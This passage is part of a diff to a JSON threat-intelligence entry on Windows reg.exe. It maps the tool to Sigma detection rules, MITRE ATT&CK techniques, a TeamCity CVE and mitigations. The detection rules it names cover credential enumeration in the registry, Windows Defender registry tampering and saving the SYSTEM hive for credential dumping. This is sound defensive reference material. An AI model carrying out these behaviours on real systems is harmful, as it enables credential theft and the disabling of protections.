+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_software_discovery.yml"
+      },
+      {
+        "title": "Reg Add Suspicious Paths",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml"
+      },
+      {
+        "title": "System Language Discovery via Reg.Exe",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_system_language_discovery.yml"
+      },
+      {
+        "title": "System Restore Registry Modification via CommandLine",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_system_restore_modification.yml"
+      },
+      {
+        "title": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml"
+      },
+      {
+        "title": "Non-privileged Usage of Reg or Powershell",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_non_priv_reg_or_ps.yml"
+      }
+    ],
+    "related_sigma_rules": 46,
+    "other_rules": []
+  },
+  "related_CVE": [
     {
-      "eventsid": [
-        {
-          "sysmon": [
-            "T1112:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
-          ],
-          "windows": [
-            "T1112:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
-            "T1552.002:script:script_execution:log_channel:Microsoft-Windows-PowerShellOperational:log_provider:Microsoft-Windows-PowerShell:4103",
-            "T1218.010:script:script_execution:log_channel:Microsoft-Windows-PowerShellOperational:log_provider:Microsoft-Windows-PowerShell:4103"
-          ]
-        }
-      ],
-      "sigma_rules": [
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_reg_add_safeboot.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_reg_enumeration_for_credentials_in_registry.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml"
-      ],
-      "other_rules": []
+      "id": "CVE-2023-42793",
+      "description": "JetBrains TeamCity authentication bypass leading to remote code execution. A threat actor who exploited it used reg.exe to save the SYSTEM registry hive for credential dumping.",
+      "references": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"
     }
   ],
-  "related_CVE": [
-    "CVE-2023-42793"
-  ],
   "mitigations": [
-    "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.",
-    "Do not store credentials within the Registry.",
-    "If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary.",
-    "Proactively search for credentials within the Registry and attempt to remediate the risk."
+    {
+      "id": "M1024",
+      "name": "Restrict Registry Permissions",
+      "technique": "T1112"
+    },
+    {
+      "id": "M1027",
+      "name": "Password Policies",
+      "technique": "T1552.002"
+    },
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "technique": "T1552.002"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1552.002"
+    },
+    {
+      "id": "M1027",
+      "name": "Password Policies",
+      "technique": "T1003.002"
+    },
+    {
+      "id": "M1017",
+      "name": "User Training",
+      "technique": "T1003.002"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1003.002"
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1003.002"
+    },
+    {
+      "id": "M1022",
+      "name": "Restrict File and Directory Permissions",
+      "technique": "T1564.004"
+    }
   ],
+  "additional_mitigations": [],
   "references": [
     "https://attack.mitre.org/software/S0075/",
     "https://strontic.github.io/xcyclopedia/library/reg.exe-227F63E1D9008B36BDBCC4B397780BE4.html",
     "https://lolbas-project.github.io/lolbas/Binaries/Reg/",
     "https://app.tidalcyber.com/software/d796615c-fa3d-4afd-817a-1a3db8c73532"
-  ]
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
 }
